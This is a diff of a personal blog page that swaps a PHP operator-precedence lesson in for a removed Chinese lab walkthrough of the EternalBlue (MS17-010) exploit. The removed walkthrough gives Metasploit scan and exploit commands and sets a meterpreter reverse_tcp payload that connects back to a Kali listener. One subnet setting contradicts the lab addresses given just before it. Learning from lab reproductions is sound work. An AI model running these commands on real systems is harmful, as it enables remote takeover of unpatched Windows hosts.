+<h4 id="4-gt"><a href="#4-gt" class="headerlink" title="4)=&gt;"></a>4)=&gt;</h4><p><a name="pMTup"></a></p>
+<h4 id="5-gt"><a href="#5-gt" class="headerlink" title="5)-&gt;"></a>5)-&gt;</h4><p><a name="XdA5q"></a></p>
+<h4 id="6-instanceof"><a href="#6-instanceof" class="headerlink" title="6)instanceof"></a>6)instanceof</h4><p><a name="mXj4Y"></a></p>
+<h3 id="9-运算符的优先级"><a href="#9-运算符的优先级" class="headerlink" title="9.运算符的优先级"></a>9.运算符的优先级</h3><p><img "" class="lazyload placeholder" data-original="https://cdn.nlark.com/yuque/0/2021/png/21656971/1628044486548-ff94e771-3cbb-4091-96c1-e6d348f738aa.png#align=left&display=inline&height=739&margin=%5Bobject%20Object%5D&name=image.png&originHeight=739&originWidth=779&size=57640&status=done&style=none&width=779" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image.png"><br /></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="number">3</span> * <span class="number">4</span> % <span class="number">5</span>; <span class="comment">// (3 * 4) % 5 = 2</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="literal">true</span> ? <span class="number">0</span> : <span class="literal">true</span> ? <span class="number">1</span> : <span class="number">2</span>; <span class="comment">// (true ? 0 : true) ? 1 : 2 = 2</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="variable">$b</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="variable">$a</span> = <span class="variable">$b</span> += <span class="number">3</span>; <span class="comment">// $a = ($b += 3) -&gt; $a = 5, $b = 5</span></span><br><span class="line">    <span class="keyword">echo</span> ++<span class="variable">$a</span> + <span class="variable">$a</span>++;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//12</span></span><br></pre></td></tr></table></figure>
 
-<p>@<a href="%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95">TOC</a></p>
-</font>
-
-<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">
-
-<h1 id="何为永恒之蓝？"><a href="#何为永恒之蓝？" class="headerlink" title="何为永恒之蓝？"></a>何为永恒之蓝？</h1><p><font color=#999AAA ></font></p>
-<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">
-
-<p><font color=#999AAA >永恒之蓝（Eternal Blue）爆发于2017年4月14日晚，是一种利用Windows系统的SMB协议漏洞来获取系统的最高权限，以此来控制被入侵的计算机。甚至于2017年5月12日， 不法分子通过改造“永恒之蓝”制作了wannacry勒索病毒，使全世界大范围内遭受了该勒索病毒，甚至波及到学校、大型企业、政府等机构，只能通过支付高额的赎金才能恢复出文件。不过在该病毒出来不久就被微软通过打补丁修复。</p>
-<h1 id="一、什么是SMB协议"><a href="#一、什么是SMB协议" class="headerlink" title="一、什么是SMB协议"></a>一、什么是SMB协议</h1><p><font color=#999AAA >SMB（全称是Server Message Block）是一个协议服务器信息块，它是一种客户机/服务器、请求/响应协议，通过SMB协议可以在计算机间共享文件、打印机、命名管道等资源，电脑上的网上邻居就是靠SMB实现的；SMB协议工作在应用层和会话层，可以用在TCP/IP协议之上，SMB使用TCP139端口和TCP445端口。</p>
-<h2 id="SMB工作原理是什么？"><a href="#SMB工作原理是什么？" class="headerlink" title="SMB工作原理是什么？"></a>SMB工作原理是什么？</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）：首先客户端发送一个SMB negport 请求数据报，，并列出它所支持的所有SMB的协议版本。服务器收到请求消息后响应请求，并列出希望使用的SMB协议版本。如果没有可以使用的协议版本则返回0XFFFFH，结束通信。</span><br><span class="line"></span><br><span class="line">     （<span class="number">2</span>）：协议确定后，客户端进程向服务器发起一个用户或共享的认证，这个过程是通过发送SessetupX请求数据包实现的。客户端发送一对用户名和密码或一个简单密码到服务器，然后通过服务器发送一个SessetupX应答数据包来允许或拒绝本次连接。</span><br><span class="line"></span><br><span class="line">      （<span class="number">3</span>）：当客户端和服务器完成了磋商和认证之后，它会发送一个Tcon或TconX SMB数据报并列出它想访问的网络资源的名称，之后会发送一个TconX应答数据报以表示此次连接是否接收或拒绝。</span><br><span class="line"></span><br><span class="line">      （<span class="number">4</span>）：连接到相应资源后，SMB客户端就能够通过<span class="built_in">open</span> SMB打开一个文件，通过read SMB读取文件，通过write SMB写入文件，通过close SMB关闭文件。</span><br></pre></td></tr></table></figure>
-
-<h1 id="二、实验环境："><a href="#二、实验环境：" class="headerlink" title="二、实验环境："></a>二、实验环境：</h1><p>1.使用kali 和windows 7旗舰版（kali作为攻击主机，windows 7旗舰版作为靶机）<br>2.设置kali 的IP地址为自动获取，查看kali  IP地址：ifconfig<img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616131421195.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br>可以看到kali 的IP地址是<strong>192.168.127.131</strong><br>3.设置windows 7的IP地址为自动获取，查看windows 7的IP地址：ipconfig<img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616131501939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br>可以看见windows 7 的IP地址为<strong>192.168.127.134</strong></p>
-<h1 id="三、实验步骤："><a href="#三、实验步骤：" class="headerlink" title="三、实验步骤："></a>三、实验步骤：</h1><p>1.测试两台主机的连通性：用kali 去Ping windows 7的主机，来测试连通性：<code>ping 192.168.127.134</code>  <strong>（记得关掉靶机的防火墙）</strong><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/2021061613170094.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br>可以看见两台主机连通性良好<br>2.查看kali 主机数据库是否开启：<code>service postgresql status</code><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616131723734.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br>由上图可以看出：Active：inactive （dead）说明数据库此时是关闭的；</p>
-<p>3.打开kali 主机的数据库： <code>service postgresql start</code></p>
-<p>4.再次查看kali 主机的数据库：<code>service postgresql status</code><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616131754963.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br>由上图可以看出：<code>Active：active （exited）</code>说明此时数据库已经打开</p>
-<p>5.进行msfdb 数据库初始化，配置数据库相关信息：<code>msfdb init</code><br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616131822701.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br>此时就可以进行永恒之蓝漏洞扫描，（<strong>永恒之蓝利用的是ms17_010漏洞，因此到这一步之后的任务就是在kali 里寻找ms17_010漏洞，并且利用该漏洞进行攻击，获得windows 7 的管理员权限</strong>）<br>6.启动msf：<code>msfconsole</code><br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616131917773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br>这样就成功进入了msf中，（<strong>每个人每次进去都会有不同的界面出现）</strong></p>
-<p>7.查看数据库连接情况：在msf命令提示符下：<code>db_status</code>(下面的msf命令提示符也说明了已经进入了msf中)<img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616132008669.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br><code>postgresql connected to msf</code> 说明已经成功连接到了<code>msf</code><br>8.搜索ms17_010:<code>search ms17_010</code><br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616132116915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br><strong>如果多次还是没有发现上述界面，那么有可能是kali 版本太低，没有ms17_010漏洞，所以建议安装更新版本的kali</strong><br>9.使用ms17_010模块进行漏洞扫描<img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616132206274.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br>扫描命令：<code>use auxiliary/scanner/smb/smb_ms17_010</code><br>攻击命令（后面使用）：<code>use exploit/windows/smb/ms17_010_eternalblue</code><br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616132303192.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br><strong><em>10.如果不知道应该使用什么命令，则输入options来获得帮助</em></strong></p>
-<p><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616132324419.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br><strong>在此，只关注两个命令：RHOSTS和THREADS，RHOSTS是要扫描的主机（主机段），THREADS是线程，默认是1，开始使用线程加快扫描</strong><br>11.设置扫描的主机或者主机段（由于靶机IP地址是192.168.127.134，因此设置扫描主机段为192.168.127.131/24）：set rhosts 192.168.223.141/24;然后设置扫描线程为20；最后输入run执行扫描。<img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616132453511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br>12.进行攻击：<code>use exploit/windows/smb/ms17_010_eternalblue</code><br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616132515521.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">设置攻击目标（靶机）：<span class="built_in">set</span> rhost <span class="number">192.168</span><span class="number">.127</span><span class="number">.134</span></span><br><span class="line"></span><br><span class="line">设置攻击载荷：<span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">设置监听主机（kali）：<span class="built_in">set</span> lhost <span class="number">192.168</span><span class="number">.127</span><span class="number">.131</span></span><br></pre></td></tr></table></figure>
-<p>利用exploit进行攻击：exploit<img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616132605398.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210616132722915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"><br>①：表示永恒之蓝覆盖成功完成<br>②：目标主机和攻击机建立了了一个shell连接，会话为session 1<br>③：得到一个meterpreter会话，尝试获取shell失败<br>④：在meterpreter会话下输入ps就能获得目标主机的当前进程<br>注： meterpreter是metasploit框架中的一个扩展模块，是后渗透攻击中的杀手锏，使用meterpreter作为攻击载荷，建立连接后可以对目标系统进行更深入的渗透，<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41880069/article/details/82908293">meterpreter模块之后渗透攻击</a><br><strong>到这里漏洞攻击已经成功，接下来要做的就是后渗透攻击，涉及到权限提升，跳板攻击，密码哈希值获取，获取shell以及其他更多信息</strong><br>参考优秀文章如下：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/104044002?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162382014616780265486845%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=162382014616780265486845&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-2-104044002.pc_search_result_cache&utm_term=%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0&spm=1018.2226.3001.4187">永恒之蓝漏洞复现</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41880069/article/details/82908131">永恒之蓝漏洞复现</a></p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过这次复现学习了不少知识 学不会的东西可以多查一查文章 多试试  有时候不知道哪里错啦 可以去问一问这方面的师父 但是通过自己来解决问题的时候  感觉是很不一样的！<br>附上windows7的镜像</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">链接：https://pan.baidu.com/s/1TWDS_VJO2LOqlKniR__4uA </span><br><span class="line">提取码：more </span><br><span class="line">复制这段内容后打开百度网盘手机App，操作更方便哦</span><br></pre></td></tr></table></figure>
 
       </div>
       
@@ -378,7 +463,7 @@
     </li>
     <li class="post-copyright-link">
     <strong>link:  </strong>
-    <a href="/2021/06/16/永恒之蓝 MS17-010 漏洞复现/" target="_blank" title="永恒之蓝 MS17-010 漏洞复现">http://nobug777.github.io/2021/06/16/永恒之蓝 MS17-010 漏洞复现/</a>
+    <a href="/2021/08/05/PHP基本语法学习/" target="_blank" title="">http://nobug777.github.io/2021/08/05/PHP基本语法学习/</a>
     </li>
     <li class="post-copyright-license">
       <strong>Copyright notice:   </strong>
@@ -401,18 +486,15 @@
     <div class="post-nav-img lazyload" data-original="/medias/1.jpg" style="background-size: cover; 
       background-position: center center;">
     </div>
-    <a href="/2021/08/05/%E5%AD%A6%E5%89%8D%E5%87%86%E5%A4%87/" class="post-nav-link">
+    <a href="/2021/08/05/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/" class="post-nav-link">
       <div class="title">
         <i class="fa fa-angle-left"></i> Prev:
         <div></div>
       </div>
       
       <!-- <div class="content">
-        
-一、学习要求
-1.html css
-2.对编程以及网站开发有弄厚的兴趣
-二、PHP概述123PHP（PHP: Hype
+        对PHP程序执行的过程进行控制！
+一、顺序执行1234&lt;?phpecho &#x27;执行到第一步!&lt;br 
       </div> -->
     </a>
   </div>
@@ -421,18 +503,20 @@
 
   
   <div class="post-nav-next post-nav-item">
-    <div class="post-nav-img lazyload" data-original="/medias/8.jpg" style="background-size: cover; 
+    <div class="post-nav-img lazyload" data-original="/medias/1.jpg" style="background-size: cover; 
       background-position: center center;">
     </div>
-    <a href="/2021/06/14/ISCC2021-Re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" class="post-nav-link">
+    <a href="/2021/08/05/%E5%AD%A6%E5%89%8D%E5%87%86%E5%A4%87/" class="post-nav-link">
       <div class="title">
         Next: <i class="fa fa-angle-right"></i>
-        <div>ISCC2021-Re部分题解</div>
+        <div></div>
       </div>
       <!-- <div class="content">
-        ﻿## ISCC2021 RE wp@TOC
-练武题0x00 Garden题目描述：
-1花园里藏了一个小宝贝，你能找到他
+        
+一、学习要求
+1.html css
+2.对编程以及网站开发有弄厚的兴趣
+二、PHP概述123PHP（PHP: Hype
       </div> -->
     </a>
   </div>
